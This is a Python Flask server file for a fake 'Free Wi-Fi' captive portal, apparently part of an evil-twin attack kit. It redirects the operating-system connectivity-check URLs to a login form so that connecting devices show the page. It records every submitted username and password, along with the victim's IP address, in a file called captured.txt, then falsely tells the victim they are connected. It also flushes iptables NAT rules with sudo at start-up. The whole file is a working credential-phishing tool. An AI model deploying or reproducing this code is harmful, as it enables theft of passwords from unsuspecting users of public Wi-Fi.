# /web_server/server.py

import os
from flask import Flask, request, redirect, render_template_string

app = Flask(__name__)

# HTML login page
LOGIN_PAGE = """
<html>
<head><title>Wi-Fi Login</title></head>
<body>
    <h1>Welcome to Free Wi-Fi</h1>
    <form method="POST" action="/login">
        <label>Username:</label><br>
        <input type="text" name="user"><br>
        <label>Password:</label><br>
        <input type="password" name="pass"><br><br>
        <input type="submit" value="Login">
    </form>
</body>
</html>
"""

# Log all HTTP requests
@app.before_request
def log_request():
    print(f"[+] {request.remote_addr} requested {request.path}")

# Captive portal detection endpoints
@app.route('/generate_204')
@app.route('/gen_204')
@app.route('/ncsi.txt')
@app.route('/hotspot-detect.html')
@app.route('/success.txt')
@app.route('/canonical.html')
@app.route('/redirect')
@app.route('/captiveportal')
def portal_aliases():
    return redirect("/", code=302)

# Serve login form at root
@app.route('/', methods=['GET'])
def index():
    return render_template_string(LOGIN_PAGE)

# Handle login credentials
@app.route('/login', methods=['POST'])
def login():
    user = request.form.get('user')
    password = request.form.get('pass')
    ip = request.remote_addr
    with open("captured.txt", "a") as f:
        f.write(f"IP: {ip}, Username: {user}, Password: {password}\n")
    return "<h1>Thank you. You are now connected.</h1>"

# Catch-all fallback
@app.route('/<path:path>')
def catch_all(path):
    return redirect("/", code=302)

if __name__ == "__main__":
    os.system("sudo iptables -t nat -F PREROUTING")
    app.run(host="0.0.0.0", port=80)